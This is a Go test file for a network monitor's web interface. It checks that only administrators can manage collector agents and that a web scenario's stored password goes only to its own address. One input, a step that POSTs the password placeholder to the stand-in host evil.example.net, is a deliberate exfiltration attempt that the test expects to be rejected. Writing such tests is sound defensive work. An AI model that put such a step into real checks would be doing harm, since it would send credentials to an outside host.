package web_test

import (
	"context"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/max-zit/watchzit/internal/agent"
	"github.com/max-zit/watchzit/internal/store"
)

// TestCollectorSafety: only administrators make collectors or assign them
// (a collector gets the devices' passwords); removing the agent ends the
// role, so a machine enrolled later under the same name gets nothing; a
// collector that never connects leaves its devices unknown, not green.
func TestCollectorSafety(t *testing.T) {
	agent.ProtectDir = func(string) error { return nil }
	e := newEnv(t)
	ctx := context.Background()
	c, _ := e.setupAdmin("192.168.1.10")
	c.post("/devices/new", "name", "site-nas", "address", "10.9.0.5", "kind", "nas", "ping", "1")
	url, fp := agentServer(t, e)
	e.srv.AgentFingerprint = fp
	r := c.post("/agents/tokens", "name", "Site", "days", "1", "max_uses", "1")
	d, err := agent.ParseEnrollCode(regexp.MustCompile(`WZ1-[A-Za-z0-9_-]+`).FindString(r.body))
	if err != nil {
		t.Fatal(err)
	}
	d.Server = url
	cfg, err := enrollWithAddresses(ctx, t.TempDir(), d, []string{"10.9.0.9"})
	if err != nil {
		t.Fatal(err)
	}
	coll := itoa64(cfg.DeviceID)

	// an operator can neither make a collector nor assign one
	c.post("/users", "username", "op", "password", "operator password 1", "role", "operator")
	op := e.client("192.168.1.31")
	op.post("/login", "username", "op", "password", "operator password 1")
	e.enroll(op)
	op.post("/account/password", "current", "operator password 1", "password", "new operator pass 1", "password2", "new operator pass 1")
	if r := op.post("/devices/"+coll+"/collector", "role", "on"); r.code != 403 {
		t.Fatalf("operator made a collector: %d", r.code)
	}
	c.post("/devices/"+coll+"/collector", "role", "on")
	if r := op.post("/devices/1/collector", "collector", coll); r.code != 403 {
		t.Fatalf("operator assigned a collector: %d", r.code)
	}
	if r := op.post("/devices/bulk", "id", "1", "action", "collector", "collector", coll); r.code != 403 {
		t.Fatalf("operator bulk-assigned a collector: %d", r.code)
	}
	if b := op.get("/devices/1").body; strings.Contains(b, `action="/devices/1/collector"`) {
		t.Fatal("the operator sees the collector form")
	}
	c.post("/devices/1/collector", "collector", coll)
	c.post("/discovery/ranges", "cidr", "10.9.0.0/24", "every", "", "collector", coll)

	// it never connected: after a while its device is unknown
	pings, _ := e.st.DeviceChecks(ctx, 1)
	old := e.now.Add(-time.Hour)
	if _, err := e.st.SaveResults(ctx, []store.CheckResult{{CheckID: pings[0].ID, At: old, Status: store.StatusUp, Text: "up"}}); err != nil {
		t.Fatal(err)
	}
	e.srv.SweepCollectors(ctx)
	if x, _ := e.st.CheckByID(ctx, pings[0].ID); x.Status != store.StatusUnknown {
		t.Fatalf("status %s with the collector away", x.Status)
	}

	// the agent is removed: no collector, its devices and range back to the console
	c.post("/devices/" + coll + "/agent/remove")
	dv, _ := e.st.DeviceByID(ctx, cfg.DeviceID)
	nas, _ := e.st.DeviceByID(ctx, 1)
	rs, _ := e.st.DiscoveryRanges(ctx)
	if dv.Collector || nas.CollectorID != 0 || len(rs) != 1 || rs[0].CollectorID != 0 {
		t.Fatalf("after removal: collector %v, nas run by %d, range by %d", dv.Collector, nas.CollectorID, rs[0].CollectorID)
	}
}

// TestScenarioSecretStays: a scenario's password goes only to its own
// address, and changing the address drops the stored one.
func TestScenarioSecretStays(t *testing.T) {
	e := newEnv(t)
	ctx := context.Background()
	c, _ := e.setupAdmin("192.168.1.10")
	c.post("/devices/new", "name", "app", "address", "10.0.0.8")
	if r := c.post("/devices/1/checks", "type", "web_scenario", "url", "https://app.example.com", "steps", "POST https://evil.example.net/x | | | p={secret}", "secret", "pw"); !strings.Contains(r.body+c.get(r.loc).body, "own address") {
		t.Fatalf("a step sending the password elsewhere was accepted: %d", r.code)
	}
	if r := c.post("/devices/1/checks", "type", "web_scenario", "url", "https://app.example.com", "steps", "FETCH /x"); !strings.Contains(r.body+c.get(r.loc).body, "GET or POST") {
		t.Fatalf("the parse error is not shown: %d", r.code)
	}
	if r := c.post("/devices/1/checks", "type", "web_scenario", "url", "https://app.example.com", "steps", "POST /login | 302 | | p={secret}", "secret", "pw"); r.code != 303 {
		t.Fatalf("scenario: %d %s", r.code, r.body)
	}
	cs, _ := e.st.DeviceChecks(ctx, 1)
	var sc *store.Check
	for _, x := range cs {
		if x.Type == store.CheckScenario {
			sc = x
		}
	}
	if sc == nil || sc.Params.Secret == "" {
		t.Fatal("no stored password")
	}
	id := itoa64(sc.ID)
	c.post("/checks/"+id, "name", sc.Name, "url", "https://app.example.com", "steps", "POST /login | 302 | | p={secret}", "interval", "60")
	if x, _ := e.st.CheckByID(ctx, sc.ID); x.Params.Secret == "" {
		t.Fatal("the password was dropped although the address stayed")
	}
	c.post("/checks/"+id, "name", sc.Name, "url", "https://other.example.org", "steps", "POST /login | 302 | | p={secret}", "interval", "60")
	if x, _ := e.st.CheckByID(ctx, sc.ID); x.Params.Secret != "" {
		t.Fatal("the password was kept for another address")
	}
}
